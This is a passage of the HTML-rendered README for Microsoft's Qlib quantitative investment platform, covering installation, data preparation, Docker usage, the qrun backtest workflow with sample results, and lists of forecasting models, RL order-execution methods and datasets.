 &lt;li&gt; &lt;p&gt;Clone the repository and install &lt;code&gt;Qlib&lt;/code&gt; as follows.&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;git clone https://github.com/microsoft/qlib.git &amp;amp;&amp;amp; cd qlib
pip install .  # `pip install -e .[dev]` is recommended for development. check details in docs/developer/code_standard_and_dev_guide.rst
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Tips&lt;/strong&gt;: If you fail to install &lt;code&gt;Qlib&lt;/code&gt; or run the examples in your environment, comparing your steps and the &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/.github/workflows/test_qlib_from_source.yml"&gt;CI workflow&lt;/a&gt; may help you find the problem.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Tips for Mac&lt;/strong&gt;: If you are using Mac with M1, you might encounter issues in building the wheel for LightGBM, which is due to missing dependencies from OpenMP. To solve the problem, install openmp first with &lt;code&gt;brew install libomp&lt;/code&gt; and then run &lt;code&gt;pip install .&lt;/code&gt; to build it successfully.&lt;/p&gt; 
&lt;h2&gt;Data Preparation&lt;/h2&gt; 
&lt;p&gt;‚ùó Due to more restrict data security policy. The official dataset is disabled temporarily. You can try &lt;a href="https://github.com/chenditc/investment_data/releases"&gt;this data source&lt;/a&gt; contributed by the community. Here is an example to download the latest data.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;wget https://github.com/chenditc/investment_data/releases/latest/download/qlib_bin.tar.gz
mkdir -p ~/.qlib/qlib_data/cn_data
tar -zxvf qlib_bin.tar.gz -C ~/.qlib/qlib_data/cn_data --strip-components=1
rm -f qlib_bin.tar.gz
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The official dataset below will resume in short future.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p&gt;Load and prepare data by running the following code:&lt;/p&gt; 
&lt;h3&gt;Get with module&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# get 1d data
python -m qlib.cli.data qlib_data --target_dir ~/.qlib/qlib_data/cn_data --region cn

# get 1min data
python -m qlib.cli.data qlib_data --target_dir ~/.qlib/qlib_data/cn_data_1min --region cn --interval 1min

&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Get from source&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# get 1d data
python scripts/get_data.py qlib_data --target_dir ~/.qlib/qlib_data/cn_data --region cn

# get 1min data
python scripts/get_data.py qlib_data --target_dir ~/.qlib/qlib_data/cn_data_1min --region cn --interval 1min

&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This dataset is created by public data collected by &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/scripts/data_collector/"&gt;crawler scripts&lt;/a&gt;, which have been released in the same repository. Users could create the same dataset with it. &lt;a href="https://github.com/microsoft/qlib/tree/main/scripts/data_collector#description-of-dataset"&gt;Description of dataset&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Please pay &lt;strong&gt;ATTENTION&lt;/strong&gt; that the data is collected from &lt;a href="https://finance.yahoo.com/lookup"&gt;Yahoo Finance&lt;/a&gt;, and the data might not be perfect. We recommend users to prepare their own data if they have a high-quality dataset. For more information, users can refer to the &lt;a href="https://qlib.readthedocs.io/en/latest/component/data.html#converting-csv-format-into-qlib-format"&gt;related document&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt; 
&lt;h3&gt;Automatic update of daily frequency data (from yahoo finance)&lt;/h3&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;This step is &lt;em&gt;Optional&lt;/em&gt; if users only want to try their models and strategies on history data.&lt;/p&gt; 
 &lt;p&gt;It is recommended that users update the data manually once (--trading_date 2021-05-25) and then set it to update automatically.&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: Users can't incrementally update data based on the offline data provided by Qlib(some fields are removed to reduce the data size). Users should use &lt;a href="https://github.com/microsoft/qlib/tree/main/scripts/data_collector/yahoo#automatic-update-of-daily-frequency-datafrom-yahoo-finance"&gt;yahoo collector&lt;/a&gt; to download Yahoo data from scratch and then incrementally update it.&lt;/p&gt; 
 &lt;p&gt;For more information, please refer to: &lt;a href="https://github.com/microsoft/qlib/tree/main/scripts/data_collector/yahoo#automatic-update-of-daily-frequency-datafrom-yahoo-finance"&gt;yahoo collector&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Automatic update of data to the "qlib" directory each trading day(Linux)&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt; &lt;p&gt;use &lt;em&gt;crontab&lt;/em&gt;: &lt;code&gt;crontab -e&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
   &lt;li&gt; &lt;p&gt;set up timed tasks:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;* * * * 1-5 python &amp;lt;script path&amp;gt; update_data_to_bin --qlib_data_1d_dir &amp;lt;user data dir&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;strong&gt;script path&lt;/strong&gt;: &lt;em&gt;scripts/data_collector/yahoo/collector.py&lt;/em&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Manual update of data&lt;/p&gt; &lt;pre&gt;&lt;code&gt;python scripts/data_collector/yahoo/collector.py update_data_to_bin --qlib_data_1d_dir &amp;lt;user data dir&amp;gt; --trading_date &amp;lt;start date&amp;gt; --end_date &amp;lt;end date&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;em&gt;trading_date&lt;/em&gt;: start of trading day&lt;/li&gt; 
   &lt;li&gt;&lt;em&gt;end_date&lt;/em&gt;: end of trading day(not included)&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Checking the health of the data&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;We provide a script to check the health of the data, you can run the following commands to check whether the data is healthy or not. &lt;pre&gt;&lt;code&gt;python scripts/check_data_health.py check_data --qlib_dir ~/.qlib/qlib_data/cn_data
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;Of course, you can also add some parameters to adjust the test results, such as this. &lt;pre&gt;&lt;code&gt;python scripts/check_data_health.py check_data --qlib_dir ~/.qlib/qlib_data/cn_data --missing_data_num 30055 --large_step_threshold_volume 94485 --large_step_threshold_price 20
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;If you want more information about &lt;code&gt;check_data_health&lt;/code&gt;, please refer to the &lt;a href="https://qlib.readthedocs.io/en/latest/component/data.html#checking-the-health-of-the-data"&gt;documentation&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- 
- Run the initialization code and get stock data:

  ```python
  import qlib
  from qlib.data import D
  from qlib.constant import REG_CN

  # Initialization
  mount_path = "~/.qlib/qlib_data/cn_data"  # target_dir
  qlib.init(mount_path=mount_path, region=REG_CN)

  # Get stock data by Qlib
  # Load trading calendar with the given time range and frequency
  print(D.calendar(start_time='2010-01-01', end_time='2017-12-31', freq='day')[:2])

  # Parse a given market name into a stockpool config
  instruments = D.instruments('csi500')
  print(D.list_instruments(instruments=instruments, start_time='2010-01-01', end_time='2017-12-31', as_list=True)[:6])

  # Load features of certain instruments in given time range
  instruments = ['SH600000']
  fields = ['$close', '$volume', 'Ref($close, 1)', 'Mean($close, 3)', '$high-$low']
  print(D.features(instruments, fields, start_time='2010-01-01', end_time='2017-12-31', freq='day').head())
  ```
 --&gt; 
&lt;h2&gt;Docker images&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;Pulling a docker image from a docker hub repository &lt;pre&gt;&lt;code class="language-bash"&gt;docker pull pyqlib/qlib_image_stable:stable
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;Start a new Docker container &lt;pre&gt;&lt;code class="language-bash"&gt;docker run -it --name &amp;lt;container name&amp;gt; -v &amp;lt;Mounted local directory&amp;gt;:/app pyqlib/qlib_image_stable:stable
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;At this point you are in the docker environment and can run the qlib scripts. An example: &lt;pre&gt;&lt;code class="language-bash"&gt;&amp;gt;&amp;gt;&amp;gt; python scripts/get_data.py qlib_data --name qlib_data_simple --target_dir ~/.qlib/qlib_data/cn_data --interval 1d --region cn
&amp;gt;&amp;gt;&amp;gt; python qlib/cli/run.py examples/benchmarks/LightGBM/workflow_config_lightgbm_Alpha158.yaml
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;Exit the container &lt;pre&gt;&lt;code class="language-bash"&gt;&amp;gt;&amp;gt;&amp;gt; exit
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;Restart the container &lt;pre&gt;&lt;code class="language-bash"&gt;docker start -i -a &amp;lt;container name&amp;gt;
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;Stop the container &lt;pre&gt;&lt;code class="language-bash"&gt;docker stop &amp;lt;container name&amp;gt;
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;Delete the container &lt;pre&gt;&lt;code class="language-bash"&gt;docker rm &amp;lt;container name&amp;gt;
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;If you want to know more information, please refer to the &lt;a href="https://qlib.readthedocs.io/en/latest/developer/how_to_build_image.html"&gt;documentation&lt;/a&gt;.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Auto Quant Research Workflow&lt;/h2&gt; 
&lt;p&gt;Qlib provides a tool named &lt;code&gt;qrun&lt;/code&gt; to run the whole workflow automatically (including building dataset, training models, backtest and evaluation). You can start an auto quant research workflow and have a graphical reports analysis according to the following steps:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;Quant Research Workflow: Run &lt;code&gt;qrun&lt;/code&gt; with lightgbm workflow config (&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/LightGBM/workflow_config_lightgbm_Alpha158.yaml"&gt;workflow_config_lightgbm_Alpha158.yaml&lt;/a&gt; as following.&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;  cd examples  # Avoid running program under the directory contains `qlib`
  qrun benchmarks/LightGBM/workflow_config_lightgbm_Alpha158.yaml
&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;If users want to use &lt;code&gt;qrun&lt;/code&gt; under debug mode, please use the following command:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;python -m pdb qlib/cli/run.py examples/benchmarks/LightGBM/workflow_config_lightgbm_Alpha158.yaml
&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;The result of &lt;code&gt;qrun&lt;/code&gt; is as follows, please refer to &lt;a href="https://qlib.readthedocs.io/en/latest/component/strategy.html#result"&gt;docs&lt;/a&gt; for more explanations about the result.&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;
'The following are analysis results of the excess return without cost.'
                       risk
mean               0.000708
std                0.005626
annualized_return  0.178316
information_ratio  1.996555
max_drawdown      -0.081806
'The following are analysis results of the excess return with cost.'
                       risk
mean               0.000512
std                0.005626
annualized_return  0.128982
information_ratio  1.444287
max_drawdown      -0.091078
&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Here are detailed documents for &lt;code&gt;qrun&lt;/code&gt; and &lt;a href="https://qlib.readthedocs.io/en/latest/component/workflow.html"&gt;workflow&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Graphical Reports Analysis: First, run &lt;code&gt;python -m pip install .[analysis]&lt;/code&gt; to install the required dependencies. Then run &lt;code&gt;examples/workflow_by_code.ipynb&lt;/code&gt; with &lt;code&gt;jupyter notebook&lt;/code&gt; to get graphical reports.&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt; &lt;p&gt;Forecasting signal (model prediction) analysis&lt;/p&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Cumulative Return of groups &lt;img src="https://github.com/microsoft/qlib/raw/main/docs/_static/img/analysis/analysis_model_cumulative_return.png" alt="Cumulative Return" /&gt;&lt;/li&gt; 
     &lt;li&gt;Return distribution &lt;img src="https://github.com/microsoft/qlib/raw/main/docs/_static/img/analysis/analysis_model_long_short.png" alt="long_short" /&gt;&lt;/li&gt; 
     &lt;li&gt;Information Coefficient (IC) &lt;img src="https://github.com/microsoft/qlib/raw/main/docs/_static/img/analysis/analysis_model_IC.png" alt="Information Coefficient" /&gt; &lt;img src="https://github.com/microsoft/qlib/raw/main/docs/_static/img/analysis/analysis_model_monthly_IC.png" alt="Monthly IC" /&gt; &lt;img src="https://github.com/microsoft/qlib/raw/main/docs/_static/img/analysis/analysis_model_NDQ.png" alt="IC" /&gt;&lt;/li&gt; 
     &lt;li&gt;Auto Correlation of forecasting signal (model prediction) &lt;img src="https://github.com/microsoft/qlib/raw/main/docs/_static/img/analysis/analysis_model_auto_correlation.png" alt="Auto Correlation" /&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt; &lt;p&gt;Portfolio analysis&lt;/p&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Backtest return &lt;img src="https://github.com/microsoft/qlib/raw/main/docs/_static/img/analysis/report.png" alt="Report" /&gt;&lt;/li&gt; 
    &lt;/ul&gt; 
    &lt;!-- 
- Score IC
![Score IC](docs/_static/img/score_ic.png)
- Cumulative Return
![Cumulative Return](docs/_static/img/cumulative_return.png)
- Risk Analysis
![Risk Analysis](docs/_static/img/risk_analysis.png)
- Rank Label
![Rank Label](docs/_static/img/rank_label.png)
--&gt; &lt;/li&gt; 
   &lt;li&gt; &lt;p&gt;&lt;a href="https://qlib.readthedocs.io/en/latest/component/report.html"&gt;Explanation&lt;/a&gt; of above results&lt;/p&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Building Customized Quant Research Workflow by Code&lt;/h2&gt; 
&lt;p&gt;The automatic workflow may not suit the research workflow of all Quant researchers. To support a flexible Quant research workflow, Qlib also provides a modularized interface to allow researchers to build their own workflow by code. &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/workflow_by_code.ipynb"&gt;Here&lt;/a&gt; is a demo for customized Quant research workflow by code.&lt;/p&gt; 
&lt;h1&gt;Main Challenges &amp;amp; Solutions in Quant Research&lt;/h1&gt; 
&lt;p&gt;Quant investment is a very unique scenario with lots of key challenges to be solved. Currently, Qlib provides some solutions for several of them.&lt;/p&gt; 
&lt;h2&gt;Forecasting: Finding Valuable Signals/Patterns&lt;/h2&gt; 
&lt;p&gt;Accurate forecasting of the stock price trend is a very important part to construct profitable portfolios. However, huge amount of data with various formats in the financial market which make it challenging to build forecasting models.&lt;/p&gt; 
&lt;p&gt;An increasing number of SOTA Quant research works/papers, which focus on building forecasting models to mine valuable signals/patterns in complex financial data, are released in &lt;code&gt;Qlib&lt;/code&gt;&lt;/p&gt; 
&lt;h3&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks"&gt;Quant Model (Paper) Zoo&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;Here is a list of models built on &lt;code&gt;Qlib&lt;/code&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/XGBoost/"&gt;GBDT based on XGBoost (Tianqi Chen, et al. KDD 2016)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/LightGBM/"&gt;GBDT based on LightGBM (Guolin Ke, et al. NIPS 2017)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/CatBoost/"&gt;GBDT based on Catboost (Liudmila Prokhorenkova, et al. NIPS 2018)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/MLP/"&gt;MLP based on pytorch&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/LSTM/"&gt;LSTM based on pytorch (Sepp Hochreiter, et al. Neural computation 1997)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/GRU/"&gt;GRU based on pytorch (Kyunghyun Cho, et al. 2014)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/ALSTM"&gt;ALSTM based on pytorch (Yao Qin, et al. IJCAI 2017)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/GATs/"&gt;GATs based on pytorch (Petar Velickovic, et al. 2017)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/SFM/"&gt;SFM based on pytorch (Liheng Zhang, et al. KDD 2017)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/TFT/"&gt;TFT based on tensorflow (Bryan Lim, et al. International Journal of Forecasting 2019)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/TabNet/"&gt;TabNet based on pytorch (Sercan O. Arik, et al. AAAI 2019)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/DoubleEnsemble/"&gt;DoubleEnsemble based on LightGBM (Chuheng Zhang, et al. ICDM 2020)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/TCTS/"&gt;TCTS based on pytorch (Xueqing Wu, et al. ICML 2021)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/Transformer/"&gt;Transformer based on pytorch (Ashish Vaswani, et al. NeurIPS 2017)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/Localformer/"&gt;Localformer based on pytorch (Juyong Jiang, et al.)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/TRA/"&gt;TRA based on pytorch (Hengxu, Dong, et al. KDD 2021)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/TCN/"&gt;TCN based on pytorch (Shaojie Bai, et al. 2018)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/ADARNN/"&gt;ADARNN based on pytorch (YunTao Du, et al. 2021)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/ADD/"&gt;ADD based on pytorch (Hongshun Tang, et al.2020)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/IGMTF/"&gt;IGMTF based on pytorch (Wentao Xu, et al.2021)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/HIST/"&gt;HIST based on pytorch (Wentao Xu, et al.2021)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/KRNN/"&gt;KRNN based on pytorch&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/Sandwich/"&gt;Sandwich based on pytorch&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Your PR of new Quant models is highly welcomed.&lt;/p&gt; 
&lt;p&gt;The performance of each model on the &lt;code&gt;Alpha158&lt;/code&gt; and &lt;code&gt;Alpha360&lt;/code&gt; datasets can be found &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/README.md"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Run a single model&lt;/h3&gt; 
&lt;p&gt;All the models listed above are runnable with &lt;code&gt;Qlib&lt;/code&gt;. Users can find the config files we provide and some details about the model through the &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks"&gt;benchmarks&lt;/a&gt; folder. More information can be retrieved at the model files listed above.&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;Qlib&lt;/code&gt; provides three different ways to run a single model, users can pick the one that fits their cases best:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Users can use the tool &lt;code&gt;qrun&lt;/code&gt; mentioned above to run a model's workflow based from a config file.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Users can create a &lt;code&gt;workflow_by_code&lt;/code&gt; python script based on the &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/workflow_by_code.py"&gt;one&lt;/a&gt; listed in the &lt;code&gt;examples&lt;/code&gt; folder.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Users can use the script &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/run_all_model.py"&gt;&lt;code&gt;run_all_model.py&lt;/code&gt;&lt;/a&gt; listed in the &lt;code&gt;examples&lt;/code&gt; folder to run a model. Here is an example of the specific shell command to be used: &lt;code&gt;python run_all_model.py run --models=lightgbm&lt;/code&gt;, where the &lt;code&gt;--models&lt;/code&gt; arguments can take any number of models listed above(the available models can be found in &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks/"&gt;benchmarks&lt;/a&gt;). For more use cases, please refer to the file's &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/run_all_model.py"&gt;docstrings&lt;/a&gt;.&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: Each baseline has different environment dependencies, please make sure that your python version aligns with the requirements(e.g. TFT only supports Python 3.6~3.7 due to the limitation of &lt;code&gt;tensorflow==1.15.0&lt;/code&gt;)&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Run multiple models&lt;/h3&gt; 
&lt;p&gt;&lt;code&gt;Qlib&lt;/code&gt; also provides a script &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/run_all_model.py"&gt;&lt;code&gt;run_all_model.py&lt;/code&gt;&lt;/a&gt; which can run multiple models for several iterations. (&lt;strong&gt;Note&lt;/strong&gt;: the script only support &lt;em&gt;Linux&lt;/em&gt; for now. Other OS will be supported in the future. Besides, it doesn't support parallel running the same model for multiple times as well, and this will be fixed in the future development too.)&lt;/p&gt; 
&lt;p&gt;The script will create a unique virtual environment for each model, and delete the environments after training. Thus, only experiment results such as &lt;code&gt;IC&lt;/code&gt; and &lt;code&gt;backtest&lt;/code&gt; results will be generated and stored.&lt;/p&gt; 
&lt;p&gt;Here is an example of running all the models for 10 iterations:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;python run_all_model.py run 10
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;It also provides the API to run specific models at once. For more use cases, please refer to the file's &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/run_all_model.py"&gt;docstrings&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Break change&lt;/h3&gt; 
&lt;p&gt;In &lt;code&gt;pandas&lt;/code&gt;, &lt;code&gt;group_key&lt;/code&gt; is one of the parameters of the &lt;code&gt;groupby&lt;/code&gt; method. From version 1.5 to 2.0 of &lt;code&gt;pandas&lt;/code&gt;, the default value of &lt;code&gt;group_key&lt;/code&gt; has been changed from &lt;code&gt;no default&lt;/code&gt; to &lt;code&gt;True&lt;/code&gt;, which will cause qlib to report an error during operation. So we set &lt;code&gt;group_key=False&lt;/code&gt;, but it doesn't guarantee that some programmes will run correctly, including:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;qlib\examples\rl_order_execution\scripts\gen_training_orders.py&lt;/li&gt; 
 &lt;li&gt;qlib\examples\benchmarks\TRA\src\dataset.MTSDatasetH.py&lt;/li&gt; 
 &lt;li&gt;qlib\examples\benchmarks\TFT\tft.py&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks_dynamic"&gt;Adapting to Market Dynamics&lt;/a&gt;&lt;/h2&gt; 
&lt;p&gt;Due to the non-stationary nature of the environment of the financial market, the data distribution may change in different periods, which makes the performance of models build on training data decays in the future test data. So adapting the forecasting models/strategies to market dynamics is very important to the model/strategies' performance.&lt;/p&gt; 
&lt;p&gt;Here is a list of solutions built on &lt;code&gt;Qlib&lt;/code&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks_dynamic/baseline/"&gt;Rolling Retraining&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/benchmarks_dynamic/DDG-DA/"&gt;DDG-DA on pytorch (Wendi, et al. AAAI 2022)&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Reinforcement Learning: modeling continuous decisions&lt;/h2&gt; 
&lt;p&gt;Qlib now supports reinforcement learning, a feature designed to model continuous investment decisions. This functionality assists investors in optimizing their trading strategies by learning from interactions with the environment to maximize some notion of cumulative reward.&lt;/p&gt; 
&lt;p&gt;Here is a list of solutions built on &lt;code&gt;Qlib&lt;/code&gt; categorized by scenarios.&lt;/p&gt; 
&lt;h3&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/rl_order_execution"&gt;RL for order execution&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://qlib.readthedocs.io/en/latest/component/rl/overall.html#order-execution"&gt;Here&lt;/a&gt; is the introduction of this scenario. All the methods below are compared &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/rl_order_execution"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/rl_order_execution/exp_configs/backtest_twap.yml"&gt;TWAP&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/rl_order_execution/exp_configs/backtest_ppo.yml"&gt;PPO: "An End-to-End Optimal Trade Execution Framework based on Proximal Policy Optimization", IJCAL 2020&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/rl_order_execution/exp_configs/backtest_opds.yml"&gt;OPDS: "Universal Trading for Order Execution with Oracle Policy Distillation", AAAI 2021&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Quant Dataset Zoo&lt;/h1&gt; 
&lt;p&gt;Dataset plays a very important role in Quant. Here is a list of the datasets built on &lt;code&gt;Qlib&lt;/code&gt;:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Dataset&lt;/th&gt; 
   &lt;th&gt;US Market&lt;/th&gt; 
   &lt;th&gt;China Market&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/qlib/contrib/data/handler.py"&gt;Alpha360&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;‚àö&lt;/td&gt; 
   &lt;td&gt;‚àö&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/qlib/contrib/data/handler.py"&gt;Alpha158&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;‚àö&lt;/td&gt; 
   &lt;td&gt;‚àö&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;a href="https://qlib.readthedocs.io/en/latest/advanced/alpha.html"&gt;Here&lt;/a&gt; is a tutorial to build dataset with &lt;code&gt;Qlib&lt;/code&gt;. Your PR to build new Quant dataset is highly welcomed.&lt;/p&gt; 
&lt;h1&gt;Learning Framework&lt;/h1&gt; 
